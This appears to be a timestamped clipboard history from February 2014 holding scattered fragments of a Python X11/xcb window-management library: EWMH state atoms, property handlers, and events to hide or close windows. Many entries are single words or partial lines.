_NET_WM_STATE_HIDDEN
* Wed 26 Feb 2014 11:09:47 PM JST
_NET_WM_STATE_HIDDEN
* Wed 26 Feb 2014 11:09:56 PM JST
StateDataAbstract
* Wed 26 Feb 2014 11:10:09 PM JST
StateHide
* Wed 26 Feb 2014 11:11:27 PM JST
atom = Connection.get_instance(display=self.display).core.atom
* Wed 26 Feb 2014 11:11:36 PM JST
atom.identify_atom('_NET_WM_STATE_BELOW')
* Wed 26 Feb 2014 11:13:01 PM JST
format_=format_
* Wed 26 Feb 2014 11:13:05 PM JST
                              
* Wed 26 Feb 2014 11:14:58 PM JST
_NET_WM_STATE_HIDDEN
* Wed 26 Feb 2014 11:17:42 PM JST
StateDataDouble
* Wed 26 Feb 2014 11:17:48 PM JST
    
* Wed 26 Feb 2014 11:17:53 PM JST
_NET_WM_STATE_HIDDEN'
* Wed 26 Feb 2014 11:18:38 PM JST
StateDataAbstract
* Wed 26 Feb 2014 11:19:18 PM JST
StateDataAbstract.__init__(self, display=display)
* Wed 26 Feb 2014 11:19:25 PM JST

* Wed 26 Feb 2014 11:19:25 PM JST

* Wed 26 Feb 2014 11:19:25 PM JST
        self.display = display

* Wed 26 Feb 2014 11:19:36 PM JST
atom = Connection.get_instance(display=self.display).core.atom
* Wed 26 Feb 2014 11:20:30 PM JST
_NET_WM_STATE_HIDDEN'
* Wed 26 Feb 2014 11:21:11 PM JST
    def __new__(cls, *args, **kwargs):
        if not hasattr(cls, 'statename1'):
            # TODO: (Atami) [2014/02/25]
            raise StandardError()
        return super(StateDataAbstract, cls).__new__(cls, *args, **kwargs)

* Wed 26 Feb 2014 11:21:44 PM JST
StateHideData
* Wed 26 Feb 2014 11:22:26 PM JST
0
* Wed 26 Feb 2014 11:23:14 PM JST
class StateHideData(StateDataAbstract):
    r"""
    """
    statename1 = 0

    def __init__(self, display=None):
        r"""
        
        @Arguments:
        - `display`:
        """
        StateDataAbstract.__init__(self, display=display)
        atom = Connection.get_instance(display=self.display).core.atom
        self.data[1] = self.statename1
        self.data[2] = atom.identify_atom('_NET_WM_STATE_HIDDEN')

* Wed 26 Feb 2014 11:27:38 PM JST
    MODE_UNSET  = 0
    MODE_SET    = 1
    MODE_TOGGLE = 2

* Wed 26 Feb 2014 11:27:55 PM JST
    def __init__(self, display=None):
        r"""SUMMARY

        __init__(display=None)

        @Arguments:
        - `display`:

        @Return:
        """
        DataMaker.__init__(self, display=display)
        atom = Connection.get_instance(display=self.display).core.atom
        self.data[1] = atom.identify_atom(getattr(self, 'statename1'))

    def make_unset_data(self, ):
        r"""SUMMARY

        unset()

        @Return:
        """
        self.data[0] = self.MODE_UNSET
        return self._pack()

    def make_set_data(self, ):
        r"""SUMMARY

        set()

        @Return:
        """
        self.data[0] = self.MODE_SET
        return self._pack()

    def make_toggle_data(self, ):
        r"""SUMMARY

        toggle()

        @Return:
        """
        self.data[0] = self.MODE_TOGGLE
        return self._pack()

* Wed 26 Feb 2014 11:28:00 PM JST

* Wed 26 Feb 2014 11:28:01 PM JST

* Wed 26 Feb 2014 11:28:01 PM JST
        self.data[1] = atom.identify_atom(getattr(self, 'statename1'))

* Wed 26 Feb 2014 11:28:23 PM JST
DataMaker
* Wed 26 Feb 2014 11:28:37 PM JST
StateDataAbstract
* Wed 26 Feb 2014 11:28:50 PM JST

* Wed 26 Feb 2014 11:28:50 PM JST

* Wed 26 Feb 2014 11:28:50 PM JST
        atom = Connection.get_instance(display=self.display).core.atom

* Wed 26 Feb 2014 11:31:06 PM JST

* Wed 26 Feb 2014 11:31:06 PM JST

* Wed 26 Feb 2014 11:31:06 PM JST
        self._display = display or ''

* Wed 26 Feb 2014 11:31:26 PM JST
atom = Connection.get_instance(display=self.display).core.atom
* Wed 26 Feb 2014 11:31:49 PM JST
_NET_WM_STATE_HIDDEN'
* Wed 26 Feb 2014 11:32:35 PM JST
object
* Wed 26 Feb 2014 11:37:15 PM JST
xcb.xproto.EventMask.SubstructureRedirect
* Wed 26 Feb 2014 11:43:16 PM JST
atom.
* Wed 26 Feb 2014 11:43:42 PM JST
'_NET_WM_STATE_HIDDEN'
* Wed 26 Feb 2014 11:44:14 PM JST
class StateHideData(StateDataAbstract):
    r"""
    """

    def __init__(self, display=None):
        r"""

        @Arguments:
        - `display`:
        """
        StateDataAbstract.__init__(self, display=display)
        self.data[1] = 0
        atom = Connection.get_instance(display=self.display).core.atom
        self.data[2] = atom.identify_atom('_NET_WM_STATE_HIDDEN')



* Wed 26 Feb 2014 11:44:36 PM JST
'_NET_WM_STATE_HIDDEN'
* Wed 26 Feb 2014 11:45:45 PM JST
xcb.xproto.EventMask.SubstructureRedirect
* Wed 26 Feb 2014 11:46:14 PM JST
from MODULE import 

* Wed 26 Feb 2014 11:48:20 PM JST
_NET_WM_STATE_HIDDEN
* Wed 26 Feb 2014 11:51:34 PM JST
STATE_HIDDEN
* Wed 26 Feb 2014 11:57:03 PM JST
xcb.xproto.EventMask.SubstructureRedirect
* Wed 26 Feb 2014 11:57:55 PM JST
set()
* Wed 26 Feb 2014 11:57:55 PM JST
shade.set()
* Thu 27 Feb 2014 12:08:00 AM JST
54526006
* Thu 27 Feb 2014 12:08:12 AM JST
_NET_WM_VISIBLE_NAME
* Thu 27 Feb 2014 12:08:40 AM JST
'UTF8_STRING'
* Thu 27 Feb 2014 12:55:22 PM JST
from
* Thu 27 Feb 2014 12:59:29 PM JST
PropertyInfoMaker
* Thu 27 Feb 2014 01:03:13 PM JST
ATOMS
* Thu 27 Feb 2014 01:04:58 PM JST
self,
* Thu 27 Feb 2014 01:07:08 PM JST
self, 
* Thu 27 Feb 2014 01:10:59 PM JST
de)
* Thu 27 Feb 2014 01:11:00 PM JST
default=(de)
* Thu 27 Feb 2014 01:11:28 PM JST
self, 
* Thu 27 Feb 2014 01:17:13 PM JST
length
* Thu 27 Feb 2014 01:25:02 PM JST
get_property_reply
* Thu 27 Feb 2014 01:25:49 PM JST
type_, 
* Thu 27 Feb 2014 01:26:56 PM JST
                                   
* Thu 27 Feb 2014 01:30:17 PM JST
54525997
* Thu 27 Feb 2014 01:42:43 PM JST
name
* Thu 27 Feb 2014 01:47:12 PM JST
type_, 
* Thu 27 Feb 2014 01:47:20 PM JST

* Thu 27 Feb 2014 01:47:20 PM JST

* Thu 27 Feb 2014 01:47:20 PM JST
        type_ = identifier.identify_atom(type_)

* Thu 27 Feb 2014 01:50:24 PM JST
ATOMS.get_length(property_)
* Thu 27 Feb 2014 01:50:28 PM JST

* Thu 27 Feb 2014 01:50:28 PM JST

* Thu 27 Feb 2014 01:50:28 PM JST
        leng = 

* Thu 27 Feb 2014 01:52:22 PM JST
get_atom_length
* Thu 27 Feb 2014 01:52:57 PM JST

* Thu 27 Feb 2014 01:52:57 PM JST

* Thu 27 Feb 2014 01:52:57 PM JST
        length = length or ATOMS.get_length(property_)

* Thu 27 Feb 2014 02:05:28 PM JST
singleton
* Thu 27 Feb 2014 02:05:35 PM JST
SingletonConnectionMeta
* Thu 27 Feb 2014 02:05:45 PM JST
singleton.
* Thu 27 Feb 2014 02:05:58 PM JST
SingleConnection
* Thu 27 Feb 2014 02:06:05 PM JST
singleton.
* Thu 27 Feb 2014 02:06:27 PM JST
._xcb_connection
* Thu 27 Feb 2014 02:06:27 PM JST
                                ._xcb_connection
* Thu 27 Feb 2014 02:08:00 PM JST
ension
* Thu 27 Feb 2014 02:13:23 PM JST
__call__          __reduce__        generate_id                    
__class__         __reduce_ex__     get_file_descriptor            
__delattr__       __repr__          get_maximum_request_length     
__dict__          __setattr__       get_setup                      
__doc__           __sizeof__        has_error                      
__format__        __str__           poll_for_event                 
__getattribute__  __subclasshook__  pref_screen                    
__hash__          core              prefetch_maximum_request_length
__init__          disconnect        wait_for_event                 
__new__           flush          

* Thu 27 Feb 2014 02:13:35 PM JST
__getattribute__  __subclasshook__  
* Thu 27 Feb 2014 02:13:36 PM JST
__format__        __str__           
* Thu 27 Feb 2014 02:13:36 PM JST
__doc__           __sizeof__        
* Thu 27 Feb 2014 02:13:36 PM JST
__dict__          __setattr__       
* Thu 27 Feb 2014 02:13:36 PM JST
__delattr__       __repr__          
* Thu 27 Feb 2014 02:13:36 PM JST
__class__         __reduce_ex__     
* Thu 27 Feb 2014 02:13:36 PM JST
__call__          __reduce__        
* Thu 27 Feb 2014 02:13:40 PM JST
__hash__          
* Thu 27 Feb 2014 02:13:43 PM JST
__init__          
* Thu 27 Feb 2014 02:13:45 PM JST
__new__           
* Thu 27 Feb 2014 02:14:32 PM JST
generate_id                    
* Thu 27 Feb 2014 02:14:36 PM JST
generate_id
* Thu 27 Feb 2014 02:14:47 PM JST
get
* Thu 27 Feb 2014 02:14:48 PM JST
get_file_descriptor
* Thu 27 Feb 2014 02:14:55 PM JST
get_maximum_request_length
* Thu 27 Feb 2014 02:15:12 PM JST
get_maximum_request_length
* Thu 27 Feb 2014 02:15:20 PM JST
get_setup
* Thu 27 Feb 2014 02:15:29 PM JST
has_error                      
poll_for_event                 
pref_screen                    
core
prefetch_maximum_request_length
disconnect
wait_for_event                 
flush          

* Thu 27 Feb 2014 02:18:52 PM JST
_xcb_connection
* Thu 27 Feb 2014 02:19:37 PM JST

* Thu 27 Feb 2014 02:19:41 PM JST
_xcb_connection
* Thu 27 Feb 2014 02:41:02 PM JST
generate_id                    
get_file_descriptor            
get_maximum_request_length     
get_setup                      
has_error                      
poll_for_event                 
pref_screen                    
core
prefetch_maximum_request_length
disconnect
wait_for_event                 
flush          

* Thu 27 Feb 2014 02:43:31 PM JST
_xcb_connection
* Thu 27 Feb 2014 02:43:38 PM JST
self.
* Thu 27 Feb 2014 02:43:44 PM JST
self.
* Thu 27 Feb 2014 02:44:27 PM JST
54526006
* Thu 27 Feb 2014 02:44:59 PM JST
shade
* Thu 27 Feb 2014 03:01:46 PM JST

* Thu 27 Feb 2014 03:01:46 PM JST

* Thu 27 Feb 2014 03:01:46 PM JST
        con.core.SendEvent(0, self.window, 0xffffff, event)

* Thu 27 Feb 2014 03:02:33 PM JST
_xcb_connection.
* Thu 27 Feb 2014 03:02:35 PM JST
_xcb_connection.
* Thu 27 Feb 2014 03:03:00 PM JST
54526006
* Thu 27 Feb 2014 03:03:20 PM JST
54525997
* Thu 27 Feb 2014 03:10:39 PM JST
SingleConnection
* Thu 27 Feb 2014 03:15:06 PM JST
Remove
* Thu 27 Feb 2014 03:25:25 PM JST
d/
* Thu 27 Feb 2014 03:30:50 PM JST
ConnectionEXT
* Thu 27 Feb 2014 03:31:30 PM JST
class ConnectionEXT(object):
    r"""Extention for Connection.
    """

    def __init__(self, display=None):
        r"""

        @Arguments:
        - `connection`:
        """
        self.display = display or ''
        self.atom = AtomIdentifier.get_instance(self.display)
        self.property = PropertyHandler(self.display)

* Thu 27 Feb 2014 03:31:43 PM JST
from xahk.xconnection.atom import AtomIdentifier
from xahk.xconnection.properties import PropertyHandler

* Thu 27 Feb 2014 03:32:03 PM JST
core
* Thu 27 Feb 2014 03:43:47 PM JST
extensions.
* Thu 27 Feb 2014 03:50:52 PM JST
54525997
* Thu 27 Feb 2014 03:52:52 PM JST
Connection.get_instance(display=self.display).ext
* Thu 27 Feb 2014 03:53:46 PM JST
54525997
* Thu 27 Feb 2014 03:54:55 PM JST
        
* Thu 27 Feb 2014 03:54:56 PM JST
type_
* Thu 27 Feb 2014 03:56:04 PM JST
@dispatch.generic()
* Thu 27 Feb 2014 03:56:34 PM JST
@dispatch.generic()
* Thu 27 Feb 2014 03:56:40 PM JST
    @dispatch.generic()
    def get_types(self, ):
        r"""SUMMARY
        
        get_types()
        
        @Return:
        """
        pass

* Thu 27 Feb 2014 03:56:58 PM JST
generic
* Thu 27 Feb 2014 03:57:12 PM JST
isinstance(atom, str)
* Thu 27 Feb 2014 03:57:33 PM JST
dispatch
* Thu 27 Feb 2014 03:57:53 PM JST
name, default='ANY'
* Thu 27 Feb 2014 03:58:09 PM JST
@get_types.when('isinstance(name, str)')
* Thu 27 Feb 2014 03:58:14 PM JST
name
* Thu 27 Feb 2014 03:58:19 PM JST
str
* Thu 27 Feb 2014 03:58:34 PM JST
        atom = ATOMS.get_types(name, default=default)
        return self.identify_atom(atom)

* Thu 27 Feb 2014 04:00:58 PM JST
        atom = ATOMS.get_types(namestr, default=default)
        return self.identify_atom(atom)

* Thu 27 Feb 2014 04:02:32 PM JST
atom
* Thu 27 Feb 2014 04:02:51 PM JST
name
* Thu 27 Feb 2014 04:02:53 PM JST
name
* Thu 27 Feb 2014 04:02:59 PM JST
name
* Thu 27 Feb 2014 04:03:25 PM JST
atom
* Thu 27 Feb 2014 04:03:30 PM JST
atom
* Thu 27 Feb 2014 04:03:39 PM JST
str(self.identify_atom(atom))
* Thu 27 Feb 2014 04:03:44 PM JST

* Thu 27 Feb 2014 04:03:44 PM JST

* Thu 27 Feb 2014 04:03:44 PM JST
        namestr = 

* Thu 27 Feb 2014 04:03:51 PM JST
name
* Thu 27 Feb 2014 04:03:54 PM JST
name
* Thu 27 Feb 2014 04:04:00 PM JST
name
* Thu 27 Feb 2014 04:04:04 PM JST
atom
* Thu 27 Feb 2014 04:04:08 PM JST
atom
* Thu 27 Feb 2014 04:04:29 PM JST

* Thu 27 Feb 2014 04:04:29 PM JST

* Thu 27 Feb 2014 04:04:30 PM JST
        print(type_)

* Thu 27 Feb 2014 04:04:30 PM JST
        print(type_)

* Thu 27 Feb 2014 04:04:30 PM JST
        print(type_)
        print(property_)

* Thu 27 Feb 2014 04:04:41 PM JST
check
* Thu 27 Feb 2014 04:04:42 PM JST
state.check
* Thu 27 Feb 2014 04:10:13 PM JST
name
* Thu 27 Feb 2014 04:10:31 PM JST
54525997
* Thu 27 Feb 2014 04:11:07 PM JST
    @dispatch.generic()
    def identify_atom(self, atom):
        r"""Base generic method of 'identify_atom'"""
        # TODO: (Atami) [2014/02/22]
        # define error
        raise ValueError()

    @identify_atom.when('isinstance(atom, AtomPair)')
    def _identify_atom_AtomPair(self, atom):
        r"""SUMMARY

        identify_atom_AtomPair(atom)

        @Arguments:
        - `atom`:

        @Return:
        """
        return atom

    @identify_atom.when('isinstance(atom, str)')
    def _identify_atom_str(self, atom):
        r"""SUMMARY

        identify_atom_str(atom)

        @Arguments:
        - `atom`:

        @Return:
        """
        name = AtomName(self, atom)
        num = self.intern_atom(atom)
        return AtomPair(name, num)

    @identify_atom.when('isinstance(atom, int)')
    def _identify_atom_int(self, atom):
        r"""SUMMARY

        identify_atom_int(atom)

        @Arguments:
        - `atom`:

        @Return:
        """
        name = self.get_atom_name(atom)
        num = AtomNumber(self, atom)
        return AtomPair(name, num)


* Thu 27 Feb 2014 04:17:51 PM JST
AtomIdentifier
* Thu 27 Feb 2014 04:18:02 PM JST
intern_atom
* Thu 27 Feb 2014 05:30:57 PM JST
delete
* Thu 27 Feb 2014 05:31:03 PM JST
delete, 
* Thu 27 Feb 2014 05:31:04 PM JST
                           
* Thu 27 Feb 2014 05:31:11 PM JST
delete
* Thu 27 Feb 2014 05:31:25 PM JST
False, 
* Thu 27 Feb 2014 05:31:25 PM JST
            False, 
* Thu 27 Feb 2014 05:32:25 PM JST
self.
* Thu 27 Feb 2014 05:32:36 PM JST
window, property_, offset=0, length=10
* Thu 27 Feb 2014 05:32:45 PM JST
self.
* Thu 27 Feb 2014 05:33:20 PM JST
self.get_property_reply(window, property_, offset=offset, length=length)
* Thu 27 Feb 2014 05:35:00 PM JST

* Thu 27 Feb 2014 05:35:00 PM JST

* Thu 27 Feb 2014 05:35:00 PM JST
        reply = self.get_property_reply

* Thu 27 Feb 2014 05:35:02 PM JST
        reply = self.get_property_reply(window, property_,
                                        offset=offset, length=length)

* Thu 27 Feb 2014 05:37:28 PM JST
_NET_WM_STATE
* Thu 27 Feb 2014 05:38:29 PM JST
[core.atom.identify_atom(x) for x in values]
* Thu 27 Feb 2014 05:39:31 PM JST
54525997
* Thu 27 Feb 2014 05:41:08 PM JST

* Thu 27 Feb 2014 05:41:08 PM JST

* Thu 27 Feb 2014 05:41:08 PM JST
        # rep = core.property.get_property_reply(self.window, '_NET_WM_STATE')

* Thu 27 Feb 2014 05:41:36 PM JST
core
* Thu 27 Feb 2014 05:41:39 PM JST
core
* Thu 27 Feb 2014 05:41:41 PM JST
core
* Thu 27 Feb 2014 05:42:20 PM JST
values
* Thu 27 Feb 2014 06:39:08 PM JST
AtomIdentifierAbstract
* Thu 27 Feb 2014 06:39:52 PM JST
AtomIdentifierAbstract
* Thu 27 Feb 2014 06:40:11 PM JST
identifier
* Thu 27 Feb 2014 06:40:26 PM JST
identifier
* Thu 27 Feb 2014 06:41:00 PM JST
AtomIdentifierAbstract
* Thu 27 Feb 2014 06:41:24 PM JST

* Thu 27 Feb 2014 06:41:24 PM JST

* Thu 27 Feb 2014 06:41:24 PM JST
        self.display = display or ''

* Thu 27 Feb 2014 06:42:33 PM JST
54525997
* Thu 27 Feb 2014 06:44:09 PM JST

* Thu 27 Feb 2014 06:44:09 PM JST

* Thu 27 Feb 2014 06:44:09 PM JST
                # self._reply.delete,

* Thu 27 Feb 2014 06:44:10 PM JST

* Thu 27 Feb 2014 06:44:10 PM JST

* Thu 27 Feb 2014 06:44:10 PM JST
                                                            # self._reply.type,

* Thu 27 Feb 2014 06:44:28 PM JST
                     
* Thu 27 Feb 2014 06:45:32 PM JST

* Thu 27 Feb 2014 06:45:32 PM JST

* Thu 27 Feb 2014 06:45:32 PM JST
        # identifier = AtomIdentifier.get_instance(self.display)

* Thu 27 Feb 2014 06:47:19 PM JST
AtomName(self, atom)
* Thu 27 Feb 2014 06:47:24 PM JST
self.intern_atom(atom)
* Thu 27 Feb 2014 06:47:27 PM JST

* Thu 27 Feb 2014 06:47:27 PM JST

* Thu 27 Feb 2014 06:47:27 PM JST
        name = 

* Thu 27 Feb 2014 06:47:28 PM JST
        name = 

* Thu 27 Feb 2014 06:47:28 PM JST
        name = 
        num = 

* Thu 27 Feb 2014 06:47:38 PM JST
self.get_atom_name(atom)
* Thu 27 Feb 2014 06:47:44 PM JST
AtomNumber(self, atom)
* Thu 27 Feb 2014 06:47:47 PM JST

* Thu 27 Feb 2014 06:47:47 PM JST

* Thu 27 Feb 2014 06:47:47 PM JST
        name = 

* Thu 27 Feb 2014 06:47:47 PM JST
        name = 

* Thu 27 Feb 2014 06:47:48 PM JST
        name = 
        num = 

* Thu 27 Feb 2014 06:49:37 PM JST

* Thu 27 Feb 2014 06:49:37 PM JST

* Thu 27 Feb 2014 06:49:37 PM JST
from xahk.atoms import ATOMS

* Thu 27 Feb 2014 07:05:41 PM JST

* Thu 27 Feb 2014 07:05:41 PM JST

* Thu 27 Feb 2014 07:05:41 PM JST
from xahk.atoms import ATOMS

* Thu 27 Feb 2014 09:08:41 PM JST
池田薫
* Thu 27 Feb 2014 11:17:16 PM JST
PropertyHandlerBase
* Thu 27 Feb 2014 11:18:40 PM JST
SUMMARY
* Fri 28 Feb 2014 02:26:48 AM JST
54525997
* Fri 28 Feb 2014 02:37:27 AM JST
_NET_WM_WINDOW_TYPE
* Fri 28 Feb 2014 02:39:43 AM JST
'_NET_WM_WINDOW_TYPE'
* Fri 28 Feb 2014 01:27:36 PM JST
return self.get_full_property(window, '_NET_WM_STATE')
* Fri 28 Feb 2014 02:03:30 PM JST
return
* Fri 28 Feb 2014 02:14:28 PM JST
        return self.get_full_property(window, '_NET_WM_ICON_NAME')
* Fri 28 Feb 2014 02:26:08 PM JST
54525997
* Fri 28 Feb 2014 02:27:12 PM JST
54525998
* Fri 28 Feb 2014 02:28:43 PM JST
54525998
* Fri 28 Feb 2014 02:29:39 PM JST
__class__         _dispatcher               net_virtual_roots       
__delattr__       display                   net_wm_allowed_actions  
__dict__          get_full_property         net_wm_desktop          
__doc__           get_property              net_wm_handled_icons    
__format__        get_property_reply        net_wm_icon             
__getattribute__  net_active_window         net_wm_icon_geometry    
__hash__          net_client_list           net_wm_icon_name        
__init__          net_client_list_stacking  net_wm_name             
__module__        net_current_desktop       net_wm_pid              
__new__           net_desktop_geometory     net_wm_state            
__reduce__        net_desktop_layout        net_wm_strut            
__reduce_ex__     net_desktop_name          net_wm_strut_partial    
__repr__          net_desktop_viewport      net_wm_user_time        
__setattr__       net_frame_extents         net_wm_visible_icon_name
__sizeof__        net_number_of_desktops    net_wm_visible_name     
__str__           net_showing_desktop       net_wm_window_type      
__subclasshook__  net_supported             net_workarea            
__weakref__       net_supporting_wm_check

* Fri 28 Feb 2014 02:29:49 PM JST
54525998
* Fri 28 Feb 2014 02:30:38 PM JST
net_wm_strut
* Fri 28 Feb 2014 02:30:49 PM JST
net_wm_strut_partial
* Fri 28 Feb 2014 02:30:58 PM JST
net_wm_user_time
* Fri 28 Feb 2014 02:31:14 PM JST
net_wm_visible_icon_name
* Fri 28 Feb 2014 02:31:23 PM JST
net_wm_visible_name
* Fri 28 Feb 2014 02:31:33 PM JST
net_wm_window_type
* Fri 28 Feb 2014 02:31:41 PM JST
net_workarea
* Fri 28 Feb 2014 02:32:12 PM JST
net_wm_desktop
* Fri 28 Feb 2014 02:35:19 PM JST
54525998
* Fri 28 Feb 2014 02:45:58 PM JST
connection = SingleConnection.get_instance(self.display)
* Fri 28 Feb 2014 02:46:55 PM JST
        raw = XCONN.get_core().GetGeometry(self.wid).reply()

        ret = {
            'x': raw.x,
            'y': raw.y,
            'width': raw.width,
            'height': raw.height
        }

        raw = XCONN.get_core().TranslateCoordinates(self.wid, raw.root, ret['x'], ret['y']).reply()

        ret['x'] = raw.dst_x - (2 * ret['x'])
        ret['y'] = raw.dst_y - (2 * ret['y'])

        return (ret['x'], ret['y'], ret['width'], ret['height'])

* Fri 28 Feb 2014 02:47:02 PM JST

* Fri 28 Feb 2014 02:47:02 PM JST

* Fri 28 Feb 2014 02:47:03 PM JST
                raw = XCONN.get_core().GetGeometry(self.wid).reply()

* Fri 28 Feb 2014 02:47:05 PM JST
reply
* Fri 28 Feb 2014 02:47:13 PM JST
get_core()
* Fri 28 Feb 2014 02:47:14 PM JST
XCONN.get_core()
* Fri 28 Feb 2014 02:47:28 PM JST
wid
* Fri 28 Feb 2014 02:47:28 PM JST
self.wid
* Fri 28 Feb 2014 02:54:36 PM JST
connection.core.GetGeometry(window).reply()
* Fri 28 Feb 2014 02:54:54 PM JST
54525998
* Fri 28 Feb 2014 02:55:41 PM JST
482
* Fri 28 Feb 2014 02:58:05 PM JST
GetGeometry
* Fri 28 Feb 2014 02:59:24 PM JST
from xahk import xconnection as xc
* Fri 28 Feb 2014 02:59:52 PM JST
54525998
* Fri 28 Feb 2014 03:02:35 PM JST
height
* Fri 28 Feb 2014 03:03:23 PM JST
time
* Fri 28 Feb 2014 03:03:23 PM JST
itme.time
* Fri 28 Feb 2014 03:05:10 PM JST
GeometryInfo
* Fri 28 Feb 2014 03:05:32 PM JST
from xahk import xconnection as xc
* Fri 28 Feb 2014 03:05:57 PM JST
54525998
* Fri 28 Feb 2014 03:06:40 PM JST
height
* Fri 28 Feb 2014 03:06:44 PM JST
width
* Fri 28 Feb 2014 03:08:45 PM JST
54525998
* Fri 28 Feb 2014 03:11:23 PM JST
amt
* Fri 28 Feb 2014 03:11:24 PM JST
for amt
* Fri 28 Feb 2014 03:15:46 PM JST
pos_x
* Fri 28 Feb 2014 03:15:51 PM JST
pos_y
* Fri 28 Feb 2014 03:16:41 PM JST
ret['
* Fri 28 Feb 2014 03:16:45 PM JST
ret['
* Fri 28 Feb 2014 03:17:29 PM JST
raw
* Fri 28 Feb 2014 03:43:17 PM JST
class StateEvent(str):
    r"""
    """
    code = request.Code(33)

    def __new__(cls, window, format_, seqnum, data, display=None):
        obj = str.__new__(cls, '')
        display = display or ''
        format_ = request.Format(format_)
        seqnum = request.SequenceNumber(seqnum)
        window = request.Window(window)
        atom = Connection.get_instance(display=display).ext.atom
        types = atom.identify_atom('_NET_WM_STATE')
        buf = StringIO()
        for elmt in (obj.code, format_, seqnum, window, types):
            buf.write(elmt.pack())
        buf.write(data)
        obj += buf.getvalue()
        return obj
* Fri 28 Feb 2014 03:43:25 PM JST
State
* Fri 28 Feb 2014 03:43:38 PM JST
'_NET_CLOSE_WINDOW'
* Fri 28 Feb 2014 03:46:55 PM JST
DataMaker.__init__(self, display=display)
* Fri 28 Feb 2014 03:47:48 PM JST

* Fri 28 Feb 2014 03:47:48 PM JST

* Fri 28 Feb 2014 03:47:48 PM JST
from xc import 

* Fri 28 Feb 2014 03:50:23 PM JST
        self.display = display or ''
        self.window = window
        self.format = format_
        self.seqnum = seqnum

* Fri 28 Feb 2014 03:51:32 PM JST
        event = StateEvent(self.window, self.format, self.seqnum, data)
        con = Connection.get_instance(display=self.display)
        con.core.SendEvent(0, self.window, 0xffffff, event)

* Fri 28 Feb 2014 03:51:47 PM JST
State
* Fri 28 Feb 2014 03:55:10 PM JST
81788931
* Fri 28 Feb 2014 03:59:29 PM JST
class CloseWindow(object):
    r"""
    """

    def __init__(self, window, format_=32, seqnum=0, display=None):
        r"""
        """
        self.display = display or ''
        self.window = window
        self.format = format_
        self.seqnum = seqnum

    def close(self, ):
        r"""SUMMARY

        close()

        @Return:
        """
        data = CloseData(display=self.display)._pack()
        event = CloseEvent(self.window, self.format, self.seqnum, data,
                           display=self.display)
        con = Connection.get_instance(display=self.display)
        con.core.SendEvent(0, self.window, 0xffffff, event)



* Fri 28 Feb 2014 03:59:43 PM JST
class CloseEvent(str):
    r"""
    """
    code = request.Code(33)

    def __new__(cls, window, format_, seqnum, data, display=None):
        obj = str.__new__(cls, '')
        display = display or ''
        format_ = request.Format(format_)
        seqnum = request.SequenceNumber(seqnum)
        window = request.Window(window)
        atom = Connection.get_instance(display=display).ext.atom
        types = atom.identify_atom('_NET_CLOSE_WINDOW')
        buf = StringIO()
        for elmt in (obj.code, format_, seqnum, window, types):
            buf.write(elmt.pack())
        buf.write(data)
        obj += buf.getvalue()
        return obj



* Fri 28 Feb 2014 03:59:57 PM JST
class CloseData(DataMaker):
    r"""
    """

    def __init__(self, display=None):
        r"""
        """
        DataMaker.__init__(self, display=display)
        self.data[0] = xcb.xproto.Time.CurrentTime



* Fri 28 Feb 2014 04:02:24 PM JST
self
* Fri 28 Feb 2014 04:02:30 PM JST
cls, window, format_, seqnum, data, display=None
* Fri 28 Feb 2014 04:02:35 PM JST
cls, 
* Fri 28 Feb 2014 04:06:23 PM JST
EventAbstract
* Fri 28 Feb 2014 04:06:34 PM JST
EventAbstract
* Fri 28 Feb 2014 04:06:58 PM JST
'_NET_WM_STATE'
* Fri 28 Feb 2014 04:09:14 PM JST
54525998
* Fri 28 Feb 2014 04:10:03 PM JST
        obj = EventAbstract.__new__(cls)
        display = display or ''
        format_ = request.Format(format_)
        seqnum = request.SequenceNumber(seqnum)
        window = request.Window(window)
        atom = Connection.get_instance(display=display).ext.atom
        types = atom.identify_atom(cls.types)
        buf = StringIO()
        for elmt in (obj.code, format_, seqnum, window, types):
            buf.write(elmt.pack())
        buf.write(data)
        obj += buf.getvalue()
        return obj

* Fri 28 Feb 2014 04:10:11 PM JST

* Fri 28 Feb 2014 04:10:11 PM JST

* Fri 28 Feb 2014 04:10:11 PM JST
        return str.__new__(cls, '')

* Fri 28 Feb 2014 04:10:24 PM JST
window, format_, seqnum, data, display=None
* Fri 28 Feb 2014 04:10:39 PM JST
EventAbstract
* Fri 28 Feb 2014 04:12:33 PM JST
54525998
* Fri 28 Feb 2014 04:14:06 PM JST
54525998
* Fri 28 Feb 2014 04:14:56 PM JST
EventAbstract
* Fri 28 Feb 2014 04:15:24 PM JST
'_NET_CLOSE_WINDOW'
* Fri 28 Feb 2014 04:19:02 PM JST

* Fri 28 Feb 2014 04:19:02 PM JST

* Fri 28 Feb 2014 04:19:02 PM JST
        display = display or ''

* Fri 28 Feb 2014 04:20:05 PM JST
elmt.pack()
* Fri 28 Feb 2014 04:20:17 PM JST

* Fri 28 Feb 2014 04:20:17 PM JST

* Fri 28 Feb 2014 04:20:17 PM JST
            buf.write(elmt.pack())

* Fri 28 Feb 2014 04:20:23 PM JST

* Fri 28 Feb 2014 04:20:23 PM JST

* Fri 28 Feb 2014 04:20:23 PM JST
        buf = StringIO()

* Fri 28 Feb 2014 04:20:33 PM JST

* Fri 28 Feb 2014 04:20:33 PM JST

* Fri 28 Feb 2014 04:20:33 PM JST
        buf.write(data)

* Fri 28 Feb 2014 04:20:33 PM JST
        buf.write(data)

* Fri 28 Feb 2014 04:20:33 PM JST
        buf.write(data)
        obj += buf.getvalue()

* Fri 28 Feb 2014 04:21:09 PM JST
from xahk import xconnection as xc
* Fri 28 Feb 2014 04:21:27 PM JST
54525998
* Fri 28 Feb 2014 04:24:47 PM JST

* Fri 28 Feb 2014 04:24:47 PM JST

* Fri 28 Feb 2014 04:24:47 PM JST
from cStringIO import StringIO

* Fri 28 Feb 2014 04:27:17 PM JST
window, 
* Fri 28 Feb 2014 04:27:20 PM JST

* Fri 28 Feb 2014 04:27:20 PM JST

* Fri 28 Feb 2014 04:27:20 PM JST
        self.window = window

* Fri 28 Feb 2014 04:27:26 PM JST
format_=32,
* Fri 28 Feb 2014 04:27:43 PM JST
self.
* Fri 28 Feb 2014 04:27:54 PM JST
self.
* Fri 28 Feb 2014 04:30:21 PM JST
window, 
* Fri 28 Feb 2014 04:30:23 PM JST

* Fri 28 Feb 2014 04:30:23 PM JST

* Fri 28 Feb 2014 04:30:23 PM JST
        self.window = window

* Fri 28 Feb 2014 04:30:36 PM JST
self.
* Fri 28 Feb 2014 04:31:28 PM JST
window
* Fri 28 Feb 2014 04:32:41 PM JST
window, 
* Fri 28 Feb 2014 04:32:44 PM JST
display=None
* Fri 28 Feb 2014 04:32:49 PM JST

* Fri 28 Feb 2014 04:32:49 PM JST

